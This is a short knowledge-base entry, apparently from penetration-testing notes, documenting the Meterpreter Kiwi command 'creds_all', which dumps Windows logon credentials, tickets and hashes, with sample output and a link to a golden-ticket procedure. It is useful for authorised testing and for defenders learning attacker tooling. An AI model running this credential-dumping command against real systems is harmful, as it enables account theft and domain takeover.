---
type: command
executor: meterpreter
data: creds_all
output: null
platforms:
  - Windows
tags:
  - kiwi
  - credential-access
verified: true
validated: true
---

# meterpreter-creds-all

## Command

```meterpreter
creds_all
```

## Description

Retrieves all available credentials from the current session using the Kiwi extension, including logon sessions, tickets, and hashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Dumps all credentials | No |

## Examples

### Basic Usage

```meterpreter
creds_all
```

## Expected Output

[*] Getting all credentials...
Authentication Id : 0 ; 123456
User : CONTOSO\Administrator
...
krbtgt NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
